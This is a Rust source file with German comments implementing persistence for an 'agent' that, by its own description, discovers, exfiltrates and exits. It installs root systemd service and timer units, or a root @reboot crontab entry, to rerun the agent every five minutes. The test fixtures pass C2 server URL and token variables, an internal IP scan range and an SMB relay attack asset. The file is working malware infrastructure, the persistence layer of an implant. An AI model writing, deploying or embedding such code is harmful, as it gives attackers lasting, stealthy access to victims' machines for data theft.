//! POSIX-Persistenz: systemd-Dienste und Cron-Jobs.
//!
//! Installiert den Agent als systemd-Dienst (boot-time) oder Cron-Job
//! (zeitgesteuert) auf Linux/Unix-Systemen.

use std::path::{Path, PathBuf};
#[cfg(unix)]
use tracing::{debug, warn};

use kx_core::persist::Invocation;

use crate::error::PosixError;

/// Verzeichnis, in dem die Environment-Dateien der Dienste liegen.
///
/// Bewusst nicht in `/etc/systemd/system/`: dort liest systemd jede Datei mit
/// `.service`-Endung als Unit, und das Verzeichnis ist für andere lesbar.
pub const ENV_DIR: &str = "/etc/kx";

/// Pfad der Environment-Datei eines Dienstes.
pub fn systemd_env_file_path(service_name: &str) -> PathBuf {
    Path::new(ENV_DIR).join(format!("{service_name}.env"))
}

/// Baut den Inhalt der Environment-Datei.
///
/// Der Inhalt ist `KEY=VALUE` pro Zeile — das Format, das systemd für
/// `EnvironmentFile=` erwartet.
pub fn systemd_env_content(inv: &Invocation) -> String {
    let mut out = String::new();
    for (key, value) in &inv.env {
        out.push_str(key);
        out.push('=');
        out.push_str(value);
        out.push('\n');
    }
    out
}

/// Baut den Inhalt der systemd-Unit-Datei.
///
/// Die Unit nennt die Environment-Datei, aber nicht deren Werte. Ein
/// `${NAME}`-Platzhalter im `ExecStart` wird von systemd zur Laufzeit aus
/// dieser Datei aufgelöst.
///
/// Der Agent ist ein **Einmal-Lauf**: er entdeckt, exfiltriert und endet.
/// `Type=simple` mit `Restart=always` startet ihn deshalb sofort wieder —
/// im Betrieb alle zwölf Sekunden. Die Unit ist darum `oneshot` ohne
/// Neustart; den Takt gibt der Timer ([`systemd_timer_content`]).
///
/// `WorkingDirectory` zeigt auf das Verzeichnis des Binaries, nicht auf das
/// Arbeitsverzeichnis des Prozesses: systemd startet den Agenten mit `/` als
/// Arbeitsverzeichnis, ein relativer Pfad (das Asset `assets/smbrelayx.py`)
/// löst sich dort nicht auf.
pub fn systemd_unit_content(inv: &Invocation) -> String {
    let path = inv.binary_path.to_string_lossy();
    let env_path = systemd_env_file_path(&inv.name);
    let env_path = env_path.to_string_lossy();
    let args = inv.args.join(" ");
    let workdir = inv
        .binary_path
        .parent()
        .filter(|dir| !dir.as_os_str().is_empty())
        .unwrap_or_else(|| Path::new("/"))
        .to_string_lossy();
    format!(
        r#"[Unit]
Description=Kx persistent agent ({name})
After=network-online.target

[Service]
Type=oneshot
EnvironmentFile={env_path}
WorkingDirectory={workdir}
ExecStart={path} {args}
Restart=no

[Install]
WantedBy={timer}
"#,
        name = inv.name,
        timer = systemd_timer_name(&inv.name),
    )
}

/// Der Name der Timer-Unit zu einem Dienstnamen.
///
/// Der Timer ist die einzige Unit, die der Betreiber aktiviert — die
/// Service-Unit hängt an ihm.
pub fn systemd_timer_name(service_name: &str) -> String {
    format!("{service_name}.timer")
}

/// Baut den Inhalt der systemd-Timer-Datei.
///
/// Der Timer gibt den Takt vor: er startet den Agenten alle fünf Minuten.
/// `Persistent=true` holt einen versäumten Lauf nach, wenn der Rechner
/// zwischenzeitlich aus war.
///
/// `Unit=` nennt die Service-Unit, die der Timer startet. Zusammen mit
/// `WantedBy={name}.timer` in der Service-Unit ist die Kette vollständig:
/// `timers.target` startet den Timer, der Timer zieht den Dienst an sich.
pub fn systemd_timer_content(inv: &Invocation) -> String {
    let name = &inv.name;
    format!(
        r#"[Unit]
Description=Kx persistent agent timer ({name})
After=network-online.target

[Timer]
OnBootSec=2min
OnUnitActiveSec=5min
Persistent=true
Unit={name}.service

[Install]
WantedBy=timers.target
"#
    )
}

/// Schreibt eine Datei nur, wenn sich ihr Inhalt ändert.
///
/// Der Agent läuft im Fünf-Minuten-Takt und schreibt die Unit-Datei bei jedem
/// Lauf. Ohne diese Prüfung wäre jeder Lauf ein Schreibvorgang — und jede
/// Betreiber-Änderung an der Unit wäre im nächsten Lauf wieder weg, zusammen
/// mit einem `daemon-reload`, den niemand braucht.
///
/// # Rückgabe
/// `true`, wenn die Datei geschrieben wurde, `false`, wenn der Inhalt schon
/// stimmte.
#[cfg(unix)]
fn write_if_changed(path: &Path, content: &str) -> Result<bool, PosixError> {
    if let Ok(bestehend) = std::fs::read_to_string(path) {
        if bestehend == content {
            return Ok(false);
        }
    }
    std::fs::write(path, content).map_err(|e| PosixError::Systemd(e.to_string()))?;
    Ok(true)
}

/// Installiert einen systemd-Systemdienst mit Timer.
///
/// # Argumente
/// * `inv` — Dienst mit Binary-Pfad, Argumenten und Umgebungsvariablen.
///
/// Schreibt drei Dateien: die Service-Unit (die Werte des Tokens stehen
/// *nicht* darin), die Timer-Unit und die Environment-Datei mit restriktiven
/// Rechten (0600 in einem Verzeichnis mit 0700).
///
/// Der Dienst ist ein Einmal-Lauf (`Type=oneshot`, `Restart=no`); den Takt gibt
/// der Timer. Aktiviert wird deshalb der Timer — die Service-Unit hängt an ihm
/// (`WantedBy={name}.timer`).
///
/// Jede Datei wird nur geschrieben, wenn sich ihr Inhalt ändert. Sonst
/// überschreibt der Agent im Fünf-Minuten-Takt jede Betreiber-Änderung und
/// löst bei jedem Lauf einen `daemon-reload` aus.
#[cfg(unix)]
pub async fn install_systemd_service(inv: &Invocation) -> Result<(), PosixError> {
    let unit_dir = Path::new("/etc/systemd/system");
    let env_dir = Path::new(ENV_DIR);

    // Verzeichnis für die Environment-Datei anlegen (0700 — nur root).
    std::fs::create_dir_all(env_dir).map_err(|e| PosixError::Systemd(e.to_string()))?;
    set_mode(env_dir, 0o700)?;

    // Environment-Datei ZUERST schreiben: existiert sie beim Start des
    // Dienstes nicht, schlägt systemd mit einem klaren Fehler fehl, statt
    // den Agenten mit leerem Token zu starten.
    let env_path = systemd_env_file_path(&inv.name);
    let mut geaendert = write_if_changed(&env_path, &systemd_env_content(inv))?;
    set_mode(&env_path, 0o600)?;

    let unit_path = unit_dir.join(format!("{}.service", inv.name));
    geaendert |= write_if_changed(&unit_path, &systemd_unit_content(inv))?;

    // Der Timer gibt den Takt vor. Ohne ihn startet die Unit nur beim Boot —
    // mit `Type=oneshot` wäre das ein Lauf, kein Dauerlauf.
    let timer_path = unit_dir.join(systemd_timer_name(&inv.name));
    geaendert |= write_if_changed(&timer_path, &systemd_timer_content(inv))?;

    // systemctl daemon-reload — nur wenn sich wirklich etwas geändert hat.
    if geaendert {
        let out = tokio::process::Command::new("systemctl")
            .arg("daemon-reload")
            .output()
            .await
            .map_err(|e| PosixError::Systemd(e.to_string()))?;
        if !out.status.success() {
            let err = String::from_utf8_lossy(&out.stderr).to_string();
            warn!("systemctl daemon-reload fehlgeschlagen: {err}");
            return Err(PosixError::Systemd(err));
        }
    }

    // Der Dienst hängt am Timer: `systemctl enable kx-agent` legt die
    // Verknüpfung `kx-agent.timer.wants/kx-agent.service` an.
    let out = tokio::process::Command::new("systemctl")
        .args(["enable", &inv.name])
        .output()
        .await
        .map_err(|e| PosixError::Systemd(e.to_string()))?;
    if !out.status.success() {
        let err = String::from_utf8_lossy(&out.stderr).to_string();
        return Err(PosixError::Systemd(err));
    }

    // Der Timer wird aktiviert und gestartet. Er startet die Service-Unit
    // alle fünf Minuten — einmalig `Type=oneshot`, ohne Neustart.
    let timer = systemd_timer_name(&inv.name);
    let out = tokio::process::Command::new("systemctl")
        .args(["enable", "--now", &timer])
        .output()
        .await
        .map_err(|e| PosixError::Systemd(e.to_string()))?;
    if !out.status.success() {
        let err = String::from_utf8_lossy(&out.stderr).to_string();
        return Err(PosixError::Systemd(err));
    }
    debug!(
        "systemd-Dienst {name} mit Timer {timer} installiert und aktiviert",
        name = inv.name
    );
    Ok(())
}

/// Setzt die Zugriffsrechte einer Datei oder eines Verzeichnisses.
#[cfg(unix)]
fn set_mode(path: &Path, mode: u32) -> Result<(), PosixError> {
    use std::os::unix::fs::PermissionsExt;
    let mut perms = std::fs::metadata(path)
        .map_err(|e| PosixError::Systemd(e.to_string()))?
        .permissions();
    perms.set_mode(mode);
    std::fs::set_permissions(path, perms).map_err(|e| PosixError::Systemd(e.to_string()))
}

/// Schreibt eine Cron-Persistenz (root-Crontab) für den angegebenen Befehl.
///
/// # Argumente
/// * `minute`  — Minute (0-59), "-1" für @reboot.
/// * `command` — vollständiger Befehl inkl. Argumente.
#[cfg(unix)]
pub async fn write_cron_persistence(minute: i32, command: &str) -> Result<(), PosixError> {
    let cron_line = if minute < 0 {
        format!("@reboot {command}")
    } else {
        format!("{minute} * * * * {command}")
    };
    // Bestehende Crontab laden, Duplikate vermeiden.
    let existing = tokio::process::Command::new("crontab")
        .arg("-l")
        .output()
        .await
        .map(|o| String::from_utf8_lossy(&o.stdout).to_string())
        .unwrap_or_default();
    if existing.contains(command) {
        debug!("Cron-Eintrag bereits vorhanden");
        return Ok(());
    }
    let new_cron = format!("{existing}\n{cron_line}\n");
    let mut child = tokio::process::Command::new("crontab")
        .arg("-")
        .stdin(std::process::Stdio::piped())
        .spawn()
        .map_err(|e| PosixError::Cron(e.to_string()))?;
    if let Some(mut stdin) = child.stdin.take() {
        use tokio::io::AsyncWriteExt;
        stdin
            .write_all(new_cron.as_bytes())
            .await
            .map_err(|e| PosixError::Cron(e.to_string()))?;
    }
    let status = child
        .wait()
        .await
        .map_err(|e| PosixError::Cron(e.to_string()))?;
    if !status.success() {
        return Err(PosixError::Cron(
            "crontab-Aktualisierung fehlgeschlagen".into(),
        ));
    }
    debug!("Cron-Persistenz installiert");
    Ok(())
}

/// Escaped einen Wert für einfache Anführungszeichen in der Shell.
#[cfg(unix)]
fn shell_single_quote(wert: &str) -> String {
    format!("'{}'", wert.replace('\'', "'\\''"))
}

/// Baut den Crontab-Befehl für eine Invocation.
///
/// Die Werte (das Token!) stehen in der Environment-Datei, nicht in der
/// Crontab — dieselbe Trennung wie bei der systemd-Unit. Der Befehl lädt die
/// Datei, exportiert die Variablen (`set -a`) und startet das Binary; die
/// `${NAME}`-Platzhalter in den Argumenten löst die Shell daraus auf.
///
/// `%` wird als `\%` escaped: cron behandelt ein nacktes Prozentzeichen als
/// Zeilenumbruch und würde den Befehl dort abschneiden.
#[cfg(unix)]
pub fn cron_command(inv: &Invocation) -> String {
    let env_path = systemd_env_file_path(&inv.name);
    let mut inner = format!(
        "set -a; . {}; set +a; exec {}",
        shell_single_quote(&env_path.to_string_lossy()),
        shell_single_quote(&inv.binary_path.to_string_lossy())
    );
    for arg in &inv.args {
        // Doppelte Anführungszeichen: die Shell expandiert ${NAME}, aber
        // ein Wert mit Leerzeichen bleibt ein Argument.
        inner.push_str(" \"");
        inner.push_str(arg);
        inner.push('"');
    }
    format!("/bin/sh -c {}", shell_single_quote(&inner)).replace('%', "\\%")
}

/// Installiert die Persistenz als `@reboot`-Cron-Job — der zweite Weg,
/// wenn kein systemd läuft (Container, minimales Image).
///
/// Schreibt dieselbe Environment-Datei wie der systemd-Dienst (0600 in
/// einem Verzeichnis mit 0700) und trägt [`cron_command`] als `@reboot`-Zeile
/// in die Crontab ein. Die Werte der Variablen stehen nicht in der Crontab.
#[cfg(unix)]
pub async fn install_cron_service(inv: &Invocation) -> Result<(), PosixError> {
    let env_dir = Path::new(ENV_DIR);
    std::fs::create_dir_all(env_dir).map_err(|e| PosixError::Cron(e.to_string()))?;
    set_mode(env_dir, 0o700)?;

    let env_path = systemd_env_file_path(&inv.name);
    write_if_changed(&env_path, &systemd_env_content(inv))?;
    set_mode(&env_path, 0o600)?;

    write_cron_persistence(-1, &cron_command(inv)).await
}

// Nicht-Unix-Plattformen: Fehler-Implementierungen.
#[cfg(not(unix))]
pub async fn install_systemd_service(_inv: &Invocation) -> Result<(), PosixError> {
    Err(PosixError::Systemd(
        "nicht auf dieser Plattform verfügbar".into(),
    ))
}

#[cfg(not(unix))]
pub async fn install_cron_service(_inv: &Invocation) -> Result<(), PosixError> {
    Err(PosixError::Cron(
        "nicht auf dieser Plattform verfügbar".into(),
    ))
}

#[cfg(not(unix))]
pub async fn write_cron_persistence(_minute: i32, _command: &str) -> Result<(), PosixError> {
    Err(PosixError::Cron(
        "nicht auf dieser Plattform verfügbar".into(),
    ))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn sample_invocation() -> Invocation {
        Invocation {
            name: "kx-agent".to_string(),
            binary_path: PathBuf::from("/usr/local/bin/kx-agent"),
            args: vec![
                "--server".to_string(),
                "${KX_C2_URL}".to_string(),
                "--token".to_string(),
                "${KX_C2_TOKEN}".to_string(),
                "--server-cert".to_string(),
                "/etc/kx/server.pem".to_string(),
                "--start".to_string(),
                "192.168.1.1".to_string(),
                "--end".to_string(),
                "192.168.1.254".to_string(),
            ],
            env: vec![
                ("KX_C2_URL".to_string(), "https://c2.local:8443".to_string()),
                ("KX_C2_TOKEN".to_string(), "geheim-token".to_string()),
            ],
        }
    }

    /// Der ExecStart enthält alle Pflichtargumente.
    ///
    /// Vor dem Fix war der `ExecStart` leer (`install_systemd_service("kx-agent",
    /// &exe, "")`). Der Agent startete nie, `Restart=always` sorgte für eine
    /// Neustart-Schleife.
    #[test]
    fn unit_exec_start_carries_every_required_argument() {
        let unit = systemd_unit_content(&sample_invocation());
        let exec = unit
            .lines()
            .find(|l| l.starts_with("ExecStart="))
            .expect("ExecStart-Zeile");
        for arg in ["--server", "--token", "--server-cert", "--start", "--end"] {
            assert!(
                exec.contains(arg),
                "der ExecStart nennt {arg} nicht: {exec}"
            );
        }
        // Der Pfad zum Binary steht vorn.
        assert!(exec.starts_with("ExecStart=/usr/local/bin/kx-agent "));
    }

    /// Das Token steht nicht im Klartext in der Unit-Datei.
    ///
    /// Die Unit-Datei unter `/etc/systemd/system/` ist für jeden lesbar, der
    /// die Datei lesen darf.
    #[test]
    fn unit_does_not_contain_the_token_in_plaintext() {
        let unit = systemd_unit_content(&sample_invocation());
        assert!(
            !unit.contains("geheim-token"),
            "das Token steht im Klartext in der Unit-Datei"
        );
        // Es wird als Platzhalter referenziert, den systemd auflöst.
        assert!(unit.contains("${KX_C2_TOKEN}"));
    }

    /// Die Unit referenziert die Environment-Datei.
    #[test]
    fn unit_references_the_environment_file() {
        let unit = systemd_unit_content(&sample_invocation());
        assert!(unit.contains("EnvironmentFile=/etc/kx/kx-agent.env"));
    }

    /// Der Token steht in der Environment-Datei, im Format das systemd erwartet.
    #[test]
    fn env_file_carries_the_token() {
        let env = systemd_env_content(&sample_invocation());
        assert!(env.contains("KX_C2_TOKEN=geheim-token\n"));
        assert!(env.contains("KX_C2_URL=https://c2.local:8443\n"));
        // KEY=VALUE pro Zeile, nichts anderes.
        for line in env.lines() {
            assert!(line.contains('='), "Zeile ohne KEY=VALUE: {line}");
        }
    }

    /// Der Pfad der Environment-Datei liegt nicht im systemd-Unit-Verzeichnis.
    ///
    /// Dort liest systemd jede `.service`-Datei als Unit, und das Verzeichnis
    /// ist für andere lesbar.
    #[test]
    fn env_file_lives_outside_the_unit_directory() {
        let path = systemd_env_file_path("kx-agent");
        assert!(path.starts_with("/etc/kx/"));
        assert!(!path.starts_with("/etc/systemd/system/"));
    }

    /// Die Unit ist ein Einmal-Lauf ohne Neustart.
    ///
    /// `Restart=always` mit `Type=simple` war die Endlosschleife: der Agent
    /// endet nach jedem Lauf, systemd startet ihn sofort wieder — im Betrieb
    /// alle zwölf Sekunden. Der Takt kommt jetzt vom Timer.
    #[test]
    fn unit_ist_ein_einmal_lauf_ohne_neustart() {
        let unit = systemd_unit_content(&sample_invocation());
        assert!(
            unit.contains("Type=oneshot"),
            "die Unit ist kein Einmal-Lauf: {unit}"
        );
        assert!(
            !unit.contains("Restart=always"),
            "die Unit startet den Agenten wieder von vorn: {unit}"
        );
        assert!(
            unit.contains("Restart=no"),
            "die Unit verbietet den Neustart nicht ausdrücklich: {unit}"
        );
    }

    /// Die Unit nennt das Verzeichnis des Binaries als Arbeitsverzeichnis.
    ///
    /// systemd startet den Agenten mit `/` als Arbeitsverzeichnis. Ein
    /// relativer Pfad — das Asset `assets/smbrelayx.py` — löst sich dort
    /// nicht auf.
    #[test]
    fn unit_setzt_das_arbeitsverzeichnis_auf_das_binary_verzeichnis() {
        let unit = systemd_unit_content(&sample_invocation());
        assert!(
            unit.contains("WorkingDirectory=/usr/local/bin"),
            "die Unit setzt kein Arbeitsverzeichnis: {unit}"
        );
    }

    /// Der Timer gibt den Takt vor und zehlt auf die Service-Unit.
    ///
    /// `OnUnitActiveSec=5min` ist der Takt, `Persistent=true` holt einen
    /// versäumten Lauf nach, `Unit=` nennt die Unit, die der Timer startet.
    #[test]
    fn timer_gibt_den_takt_vor() {
        let timer = systemd_timer_content(&sample_invocation());
        assert!(
            timer.contains("OnBootSec=2min"),
            "der Timer startet nicht nach dem Boot: {timer}"
        );
        assert!(
            timer.contains("OnUnitActiveSec=5min"),
            "der Timer taktet nicht im Fünf-Minuten-Raster: {timer}"
        );
        assert!(
            timer.contains("Persistent=true"),
            "der Timer holt keinen versäumten Lauf nach: {timer}"
        );
        assert!(
            timer.contains("Unit=kx-agent.service"),
            "der Timer nennt die Service-Unit nicht: {timer}"
        );
        assert!(
            timer.contains("WantedBy=timers.target"),
            "der Timer hängt nicht an timers.target: {timer}"
        );
    }

    /// Die Service-Unit hängt am Timer.
    ///
    /// Nur so startet der Timer die Service-Unit — ein Timer ohne diese
    /// Verknüpfung läuft ins Leere.
    #[test]
    fn die_service_unit_haengt_am_timer() {
        let unit = systemd_unit_content(&sample_invocation());
        assert!(
            unit.contains("WantedBy=kx-agent.timer"),
            "die Service-Unit hängt nicht am Timer: {unit}"
        );
    }

    /// Der Cron-Befehl lädt die Environment-Datei und kennt das Token nicht.
    ///
    /// Die Werte gehören in die Datei mit 0600, nicht in die Crontab —
    /// dieselbe Trennung wie bei der systemd-Unit.
    #[cfg(unix)]
    #[test]
    fn der_cron_befehl_laedt_die_env_datei_und_traegt_kein_token() {
        let cmd = cron_command(&sample_invocation());
        assert!(cmd.starts_with("/bin/sh -c '"), "Shell-Aufruf: {cmd}");
        // Die inneren einfachen Quotes sind escaped ('\'') — die Shell
        // entpackt sie; der Pfad selbst muss unverändert vorkommen.
        assert!(cmd.contains("set -a"), "Export an: {cmd}");
        assert!(cmd.contains("/etc/kx/kx-agent.env"), "Env-Datei: {cmd}");
        assert!(cmd.contains("set +a"), "Export aus: {cmd}");
        assert!(cmd.contains("exec"), "exec: {cmd}");
        assert!(cmd.contains("/usr/local/bin/kx-agent"), "Binary: {cmd}");
        assert!(
            cmd.contains("\"${KX_C2_TOKEN}\""),
            "Platzhalter bleibt: {cmd}"
        );
        assert!(
            !cmd.contains("geheim-token"),
            "kein Wert in der Crontab: {cmd}"
        );
    }

    /// Ein Prozentzeichen wird escaped: cron schneidet den Befehl sonst ab.
    #[cfg(unix)]
    #[test]
    fn ein_prozentzeichen_im_cron_befehl_wird_escaped() {
        let mut inv = sample_invocation();
        inv.args.push("100%".to_string());
        let cmd = cron_command(&inv);
        assert!(cmd.contains("100\\%"), "escaped: {cmd}");
        assert!(!cmd.contains("100%\""), "kein nacktes Prozent: {cmd}");
    }

    /// Ein einfaches Anführungszeichen im Pfad bricht die Shell-Quoting nicht.
    #[cfg(unix)]
    #[test]
    fn einfache_anfuehrungszeichen_im_pfad_werden_escaped() {
        let mut inv = sample_invocation();
        inv.binary_path = PathBuf::from("/opt/kx'agent/kx-agent");
        let cmd = cron_command(&inv);
        assert!(cmd.contains("'\\''"), "Quote-Escape: {cmd}");
    }

    /// Eine Datei wird nur geschrieben, wenn sich ihr Inhalt ändert.
    ///
    /// Der Agent läuft im Fünf-Minuten-Takt. Ohne diese Prüfung wäre jeder
    /// Lauf ein Schreibvorgang — und eine Betreiber-Änderung an der Unit
    /// wäre im nächsten Lauf wieder weg.
    #[cfg(unix)]
    #[test]
    fn eine_datei_wird_nur_bei_abweichung_geschrieben() {
        let dir = std::env::temp_dir().join(format!("kx-persist-test-{}", std::process::id()));
        std::fs::create_dir_all(&dir).expect("Testverzeichnis");
        let pfad = dir.join("unit.txt");

        // Der erste Lauf schreibt.
        assert!(write_if_changed(&pfad, "inhalt A").expect("Schreiben"));
        assert_eq!(std::fs::read_to_string(&pfad).unwrap(), "inhalt A");

        // Der zweite Lauf mit demselben Inhalt schreibt nicht.
        assert!(!write_if_changed(&pfad, "inhalt A").expect("Schreiben"));
        assert_eq!(std::fs::read_to_string(&pfad).unwrap(), "inhalt A");

        // Geänderter Inhalt wird geschrieben.
        assert!(write_if_changed(&pfad, "inhalt B").expect("Schreiben"));
        assert_eq!(std::fs::read_to_string(&pfad).unwrap(), "inhalt B");

        std::fs::remove_dir_all(&dir).ok();
    }
}
